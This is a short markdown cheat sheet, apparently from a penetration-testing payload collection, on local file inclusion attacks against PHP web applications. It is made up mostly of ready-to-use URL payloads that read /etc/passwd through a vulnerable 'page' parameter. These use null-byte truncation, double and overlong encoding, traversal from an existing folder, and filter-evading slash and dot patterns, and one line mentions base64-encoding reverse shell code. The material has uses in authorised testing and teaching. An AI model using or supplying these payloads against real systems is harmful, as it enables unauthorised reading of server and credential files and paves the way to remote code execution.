# Local file inclusion

## Null byte (%00)
Bypass the "append more chars at the end of the provided string" (bypass of: `$_GET['param']."php"`). 
Solved since PHP 5.4

```text
http://example.com/index.php?page=../../../etc/passwd%00
```

## Encoding
Got to have it right the first time. If not, it may break things. 

```text
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

Better yet, Burp suite has a Decoder tab with `encode` function. To base64, for sending reverse shell code.

## From existent folder

Maybe the back-end is checking the folder path:
```text
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```

## Bypassing filters

```text
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

Maintain the initial path: 
```text
http://example.com/index.php?page=/var/www/../../etc/passwd
```
